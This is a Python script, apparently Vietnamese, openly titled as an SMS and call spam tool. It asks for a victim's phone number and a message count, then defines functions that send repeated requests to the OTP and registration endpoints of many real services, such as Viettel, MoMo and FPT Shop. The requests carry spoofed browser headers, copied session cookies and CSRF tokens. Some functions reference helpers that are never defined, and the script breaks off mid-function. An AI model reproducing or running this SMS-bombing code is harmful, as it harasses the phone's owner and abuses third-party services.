import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
ban = """\033[1;31m

\033[1;35m Welcome...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


  _____          _    _____           _       _______          _     
 |  __ \        | |  / ____|         ( )     |__   __|        | |    
 | |__) |___  __| | | (___  _   _ ___|/ ___     | | ___   ___ | |___ 
 |  _  // _ \/ _` |  \___ \| | | / __| / __|    | |/ _ \ / _ \| / __|
 | | \ |  __| (_| |  ____) | |_| \__ \ \__ \    | | (_) | (_) | \__ \
 |_|  \_\___|\__,_| |_____/ \__,_|___/ |___/    |_|\___/ \___/|_|___/
                                                                     
                                                                     

   !! TOOL SPAM CALL/SMS !!
\033[1;35m 
\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  © Coppyright: Red Sus's#4873 
\033[1;91m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;33m !! Cracked By Red Sus's !!
\033[1;32m Contact Discord : @redsus.vn 
\033[1;31m Discord Server : https://discord.gg/hicks
\033[1;35m 
\033[1;37m 
\033[1;35m 

"""
def banner():
  os.system("clear")
  for h in ban:
    sys.stdout.write(h)
    sys.stdout.flush()
    time.sleep(0.0003)   
banner()
amount = 5000
sdt = input("[ + ] Nhập Số Điện Thoại Cần Spam: ")
while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
  print("⚜ Sai Định Dạng !!")
  sdt = input("[ + ] Nhập Số Điện Thoại Cần Spam: ")
count = int(input("[ + ] Số Lượng Tin Nhắn / Call Cần Spam [ Nên Để 200 ]: "))

threading = ThreadPoolExecutor(max_workers=int(100000))  
def vayvnd(sdt):
  data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("sdt",sdt)
  head = {
    "Host":"api.vayvnd.vn",
    "accept":"application/json",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "site-id":"3",
    "content-type":"application/json; charset=utf-8",
    "origin":"https://vayvnd.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vayvnd.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vayvnd.vn/v2/users",data=data,headers=head).json()
def tamo(sdt):
  data = '{"mobilePhone":{"number":"sdt"}}'.replace("sdt",sdt)
  head = {
    "Host":"api.tamo.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://www.tamo.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://www.tamo.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()

def meta(sdt):
  data = '{"api_args":{"lgUser":"sdt","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("sdt",sdt)
  head = {
    "Host":"meta.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://meta.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-origin",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://meta.vn/account/register",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1",data=data,headers=head).text
def kiot(phone):
    cookies = {
        'AKA_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        '_fbp': 'fb.1.1687347277057.810313564',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        '_gid': 'GA1.2.1225607496.1687347277',
        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
        'parent': '65',
        '_ga': 'GA1.2.1568204857.1687347277',
    }

    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'AKA_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': '+84'+phone[1:],
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': '0972936627',
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': "0338607465",
    }

    response = requests.post(
        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
        cookies=cookies,
        headers=headers,
        data=data,
    ).text
def fpt(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
def alfrescos(sdt):
  data = '{"phoneNumber":"sdt","secureHash":"33f65da1c264ef7f519149065a600def","deviceId":"","sendTime":1691068424578,"type":2}'.replace("sdt",sdt)
  head = {
    "Host":"api.alfrescos.com.vn",
    "accept":"application/json, text/plain, */*",
    "brandcode":"ALFRESCOS",
    "devicecode":"web",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://alfrescos.com.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://alfrescos.com.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN",data=data,headers=head).json()
def poyeye(sdt):
  data= '{"phone":"sdt","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'
  data = data.replace("sdt",sdt)
  head = {
    "Host":"api.popeyes.vn",
    "accept":"application/json",
    "x-client":"WebApp",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://popeyes.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.popeyes.vn/api/v1/register",data=data, headers=head).json()

def vieon(sdt):
  data = f'phone_number={sdt}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
def tv360(sdt):
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
  }
  data = '{"msisdn":"sdt"}'
  data = data.replace("sdt",sdt)
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
  '''if not rq["errorCode"] == 200:
    print("Lỗi 360tv")'''

def winmart(sdt):
  head = {
    "Host":"api-crownx.winmart.vn",
    "accept":"application/json",
    "authorization":"Bearer undefined",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://winmart.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}",headers=head).json()
def fptplay(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()
def funring(sdt):
  data ='{"username": "sdt"}'.replace("sdt",sdt)
  head = {
    "Host":"funring.vn",
    "Connection":"keep-alive",
    "Accept":"*/*",
    "User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "Content-Type":"application/json",
    "X-Requested-With":"mark.via.gp",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
  }
  rq = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",data=data,headers=head).json()
def apispam(phone):
  cookies = {
    '_ga': 'GA1.1.1928856259.1691039310',
    'serverChoice': 'Server-IPv1',
    '_ga_Y4RF4MF664': 'GS1.1.1691039309.1.1.1691039359.0.0.0',
  }
  headers = {
    'authority': 'crowstore.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1928856259.1691039310; serverChoice=Server-IPv1; _ga_Y4RF4MF664=GS1.1.1691039309.1.1.1691039359.0.0.0',
    'origin': 'https://crowstore.online',
    'referer': 'https://crowstore.online/sms.php',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}
  data = {
    'sodienthoai': phone,
    'ten_server': 'Server-IPv1',
    'key': 'freekey307',
}

  response = requests.post('https://crowstore.online/sms.php', cookies=cookies, headers=headers, data=data).text
def vietid(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers).text
def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).text
def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data).text
    
def zlpay(phone):
    token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
    json_data = {'phone_number': "0"+phone[1:11],'send_otp_token': token}
    response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
###

def momo(phone):
    microtime = int(round(time.time() * 1000))
    imei = getimei()
    secureid = get_SECUREID()
    token= get_TOKEN()
    rkey = generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    aaid = getimei()
    data = {
        "user":"0"+phone[1:11],
        "msgType": "SEND_OTP_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "action": "SEND",
            "rkey": rkey,
            "AAID": aaid,
            "IDFA": "",
            "TOKEN": token,
            "SIMULATOR": "",
            "SECUREID": secureid,
            "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
            "isVoice": True,
            "REQUIRE_HASH_STRING_OTP": True,
            "checkSum": ""
        }
    }
    data1 = {
        "user":"0"+phone[1:11],
        "msgType": "CHECK_USER_BE_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "checkSum": ""
        }
    }
    h = {
        "agent_id" : "undefined",
        "sessionkey" : "",
        "user_phone" : "undefined",
        "authorization" : "Bearer undefined",
        "msgtype" : "SEND_OTP_MSG",
        "Host" : "api.momo.vn",
        "User-Agent" : "okhttp/3.14.17",
        "app_version": "31062",
        "app_code" : "3.1.6",
        "device_os" : "ANDROID",
        "Content-Type" : "application/json"
    }
    data = json.dumps(data)
    data1 = json.dumps(data1)
